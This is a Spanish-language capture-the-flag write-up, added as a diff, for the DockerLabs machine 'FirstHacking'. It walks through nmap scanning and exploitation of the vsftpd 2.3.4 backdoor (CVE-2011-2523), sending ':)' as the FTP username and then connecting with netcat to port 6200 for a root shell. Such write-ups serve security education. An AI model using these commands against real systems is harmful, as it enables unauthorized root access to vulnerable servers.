@@ -1,0 +1,162 @@
+---
+title: FirstHacking
+description: Resolución completa de la máquina virtual *FirstHacking* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **FirstHacking**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
+El laboratorio expone un servicio FTP vulnerable a la vulnerabilidad **CVE-2011-2523** (backdoor en vsftpd 2.3.4), que permite la ejecución remota de comandos mediante el envío de un carácter especial como nombre de usuario. 
+Al activar la vulnerabilidad, se abre una shell en el puerto 6200 a la que se puede acceder con Netcat, obteniendo acceso directamente como usuario `root` sin necesidad de escalada de privilegios adicional.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'FirstHacking',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Muy Fácil',
+    Fecha: '14/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip FirstHacking.zip
+sudo bash auto_deplo.sh FirstHacking.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p FirstHacking/{content,exploits,nmap,scripts}
+cd FirstHacking
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748591300/Ports_s5ddfh.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado del servicio FTP para identificar la versión:
+
+```bash
+nmap -sCV -p21 172.17.0.2 -oN targeted
+```
+
+![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748591300/Services_l1u8xt.png)
+
+El escaneo revela el servicio `vsftpd 2.3.4`, una versión conocida por ser vulnerable a una backdoor que permite ejecución remota de comandos.
+
+Se realiza un escaneo específico para confirmar la vulnerabilidad:
+
+```bash
+nmap -p21 --script vuln 172.17.0.2
+```
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+La vulnerabilidad **CVE-2011-2523** afecta a `vsftpd 2.3.4` y permite la ejecución remota de comandos. Al conectarse al servicio FTP y proporcionar `:)` como nombre de usuario, se activa una shell de administración en el puerto 6200.
+
+Se realiza la conexión al FTP mediante telnet:
+
+```bash
+telnet 172.17.0.2 21
+```
+
+Al solicitar el usuario, se introduce `:)`:
+
+```
+Usuario: :)
+```
+
+![FTP Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1748591300/telnet_zg3yds.png)
+
+Tras activar la backdoor, se conecta a la shell abierta en el puerto 6200 con Netcat:
+
+```bash
+nc -v 172.17.0.2 6200
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+No es necesaria la escalada de privilegios, ya que se ha obtenido acceso directamente como usuario `root` a través de la backdoor.
+
+![Root acceso](https://res.cloudinary.com/dewqswzke/image/upload/v1748591300/root_gjwsgj.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Backdoor en vsftpd 2.3.4 (CVE-2011-2523)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como root"
+    },
+    {
+      vulnerability: "Puerto 6200 abierto sin autenticación",
+      severity: "Crítica",
+      impact: "Acceso directo a shell como administrador"
+    },
+    {
+      vulnerability: "Servicio FTP expuesto públicamente",
+      severity: "Alta",
+      impact: "Vector de ataque accesible desde la red"
+    },
+    {
+      vulnerability: "Falta de actualizaciones de seguridad",
+      severity: "Alta",
+      impact: "Vulnerabilidad conocida sin parchear"
+    },
+    {
+      vulnerability: "Uso de software obsoleto",
+      severity: "Media",
+      impact: "Múltiples vulnerabilidades potenciales"
+    }
+  ]}
+/>
